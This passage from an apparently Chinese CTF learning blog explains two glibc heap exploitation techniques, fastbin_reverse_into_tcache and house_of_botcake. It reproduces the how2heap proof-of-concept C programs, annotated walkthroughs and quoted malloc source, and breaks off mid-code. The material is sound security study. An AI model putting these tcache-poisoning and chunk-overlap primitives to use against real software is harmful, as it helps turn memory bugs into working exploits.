class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"This attack is intended to have a similar effect to the unsorted_bin_attack,\n"</span></span><br><span class="line">    <span class="string">"except it works with a small allocation size (allocsize &lt;= 0x78).\n"</span></span><br><span class="line">    <span class="string">"The goal is to set things up so that a call to malloc(allocsize) will write\n"</span></span><br><span class="line">    <span class="string">"a large unsigned value to the stack.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span></span><br><span class="line">    <span class="string">"(More than 7 times works fine too.)\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The next pointer that we free is the chunk that we're going to corrupt: %p\n"</span></span><br><span class="line">    <span class="string">"It doesn't matter if we corrupt it now or later. Because the tcache is\n"</span></span><br><span class="line">    <span class="string">"already full, it will go in the fastbin.\n\n"</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Next we need to free between 1 and 6 more pointers. These will also go\n"</span></span><br><span class="line">    <span class="string">"in the fastbin. If the stack address that we want to overwrite is not zero\n"</span></span><br><span class="line">    <span class="string">"then we need to free exactly 6 more pointers, otherwise the attack will\n"</span></span><br><span class="line">    <span class="string">"cause a segmentation fault. But if the value on the stack is zero then\n"</span></span><br><span class="line">    <span class="string">"a single free is sufficient.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The stack address that we intend to target: %p\n"</span></span><br><span class="line">    <span class="string">"It's current value is %p\n"</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Now we use a vulnerability such as a buffer overflow or a use-after-free\n"</span></span><br><span class="line">    <span class="string">"to overwrite the next pointer at address %p\n\n"</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Let's just print the contents of our array on the stack now,\n"</span></span><br><span class="line">    <span class="string">"to show that it hasn't been modified yet.\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The next allocation triggers the stack to be overwritten. The tcache\n"</span></span><br><span class="line">    <span class="string">"is empty, but the fastbin isn't, so the next allocation comes from the\n"</span></span><br><span class="line">    <span class="string">"fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"</span></span><br><span class="line">    <span class="string">"Those 7 chunks are copied in reverse order into the tcache, so the stack\n"</span></span><br><span class="line">    <span class="string">"address that we are targeting ends up being the first chunk in the tcache.\n"</span></span><br><span class="line">    <span class="string">"It contains a pointer to the next chunk in the list, which is why a heap\n"</span></span><br><span class="line">    <span class="string">"pointer is written to the stack.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Earlier we said that the attack will also work if we free fewer than 6\n"</span></span><br><span class="line">    <span class="string">"extra pointers to the fastbin, but only if the value on the stack is zero.\n"</span></span><br><span class="line">    <span class="string">"That's because the value on the stack is treated as a next pointer in the\n"</span></span><br><span class="line">    <span class="string">"linked list and it will trigger a crash if it isn't a valid pointer or null.\n"</span></span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"The contents of our array on the stack now look like this:\n\n"</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"\n"</span></span><br><span class="line">    <span class="string">"Finally, if we malloc one more time then we get the stack address back: %p\n"</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="keyword">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行审计与调试下来，可以发现其实流程十分简单：</p><p>先创建14个能进入fastbin大小的chunk，然后先释放其中7个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">  ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">"First we need to free(allocsize) at least 7 times to fill the tcache.\n"</span></span><br><span class="line">  <span class="string">"(More than 7 times works fine too.)\n\n"</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill the tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就将tcache填满了。</p><p>然后重点来了，我们记录下attack chunk(第8个被释放chunk(也就是第一个加入fashbin的chunk</p><p>)的指针。</p><p><img src="image-20220618185010440.png" alt="image-20220618185010440">然后再释放掉所用的chunk,让它们全部加入fastbin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(victim);</span><br><span class="line"><span class="comment">// Fill the fastbin.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">  <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后获取栈上地址为目标写入地址，同时将attack chunk的fd改为目标写入地址-0x10的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line"><span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line"><span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">*(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>创造7个chunk 让tcache 清空.</p><p><img src="image-20220618185047126.png" alt="image-20220618185047126"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Empty tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">  ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(allocsize);</span><br></pre></td></tr></table></figure><p>这时，再创一个chunk 就可以看到攻击完成attack chunk 的 fd 对应地址+0x10变成一个fake chunk的进入 tcache 首。</p><p><img src="image-20220618185221433.png" alt="image-20220618185221433"></p><p>在与之同时，将 fd 对应地址的值，加入到原本大小fastbin 中</p><p>并且，在攻击完成前：</p><p><img src="image-20220618185120234.png" alt="image-20220618185120234"></p><p>在攻击完成后：</p><p><img src="image-20220618185244042.png" alt="image-20220618185244042"></p><p>对照可以发现，攻击完成，同时在目标写入地址 写入了attack chunk 地址和key的值。</p><h2 id="攻击实现的glibc原理"><a href="#攻击实现的glibc原理" class="headerlink" title="攻击实现的glibc原理"></a>攻击实现的glibc原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="comment">//判定tcache为空，同时fastbin有chunk</span></span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count <span class="comment">//判断tache 是否满</span></span><br><span class="line">         &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)<span class="comment">//判定上一个fastbin 的fd是否为空</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = tc_victim-&gt;fd;<span class="comment">//获取fastbin 的fd</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在tcache为空而fastbin不为空，堆管理把fashbin放入tcahe时，会按照fashbin被使用的顺序将fashbin一个取出分析（即后进先出的原理）。这时，我们的attack chunk第一个进入fastbin，那么它将会最后一个出来。同时，这个代码对fastbin 加入 tachae 的依据是tache 是否填满和上个fastbin 的fd指针，并未判断fd的合法性，导致我们可以伪造fd来让第7个进入 tachae  的chunk被我们控制，而不影响堆管理逻辑顺序。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://bbs.pediy.com/thread-272884.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-272884.htm</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap-house_of_botcake-学习</title>
      <link href="/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>在2.29版本上的libc中，由于 tcache 加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效。<a id="more"></a></p><p>2.29前</p><p><img src="image-20220615114331112.png" alt="image-20220615114331112"></p><p>2.29后</p><p><img src="image-20220615114415661.png" alt="image-20220615114415661"></p><p>这个key一般是指向 manage chunk。</p><h2 id="house-of-botcake的目的、本质与条件"><a href="#house-of-botcake的目的、本质与条件" class="headerlink" title="house_of_botcake的目的、本质与条件"></a>house_of_botcake的目的、本质与条件</h2><p>目的：</p><p>在2.29版本上的libc中，制造堆块重叠。</p><p>本质：</p><p>利用的本质是让 chunk 在 <strong>unsorted bin</strong> 和 <strong>tcache</strong> 中同时存在，从而造成 UAF 可以修改 key 的内容。</p><p>条件:</p><p>1.我们能够控制已经free的chunk进行，再次free.(double free の变种)。</p><p>2.能填满tcache ，得到 unsorted bin。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NX：-z execstack &#x2F; -z noexecstack (关闭 &#x2F; 开启) 不让执行栈上的数据，于是JMP ESP就不能用了</span><br><span class="line">Canary：-fno-stack-protector &#x2F;-fstack-protector &#x2F; -fstack-protector-all (关闭 &#x2F; 开启 &#x2F; 全开启) 栈里插入cookie信息</span><br><span class="line">PIE：-no-pie &#x2F; -pie (关闭 &#x2F; 开启) 地址随机化，另外打开后会有get_pc_thunk</span><br><span class="line">RELRO：-z norelro &#x2F; -z lazy &#x2F; -z now (关闭 &#x2F; 部分开启 &#x2F; 完全开启) 对GOT表具有写权限</span><br></pre></td></tr></table></figure><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.32-2.34</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This file demonstrates a powerful tcache poisoning attack by tricking malloc into"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"returning a pointer to an arbitrary location (in this demo, the stack)."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This attack only relies on double free.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The address we want malloc() to return, namely,"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"the target address is %p.\n\n"</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Preparing heap layout"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocating a chunk for later consolidation: prev @ %p\n"</span>, prev);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Allocating the victim chunk: a @ %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we are able to cause chunk overlapping"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 1: fill up tcache list"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we have the chunk overlapping primitive:"</span>);</span><br><span class="line">    <span class="keyword">int</span> prev_size = prev[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="keyword">int</span> a_size = a[<span class="number">-1</span>] &amp; <span class="number">0xff0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"prev @ %p, size: %#x, end @ %p\n"</span>, prev, prev_size, (<span class="keyword">void</span> *)prev+prev_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"victim @ %p, size: %#x, end @ %p\n"</span>, a, a_size, (<span class="keyword">void</span> *)a+a_size);</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">    prev[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>)] = <span class="number">0x41414141</span>;</span><br><span class="line">    assert(a[<span class="number">0</span>] == <span class="number">0x41414141</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们分配了7个chunk来为以后填满tcache做准备：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再准备用于攻击的两个chunk，和隔离的chunk。其中a chunk 是我们将要 double free的chunk，prev chunk 是将用于辅助uaf的chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating a chunk for later consolidation: prev @ %p\n"</span>, prev);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocating the victim chunk: a @ %p\n"</span>, a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span 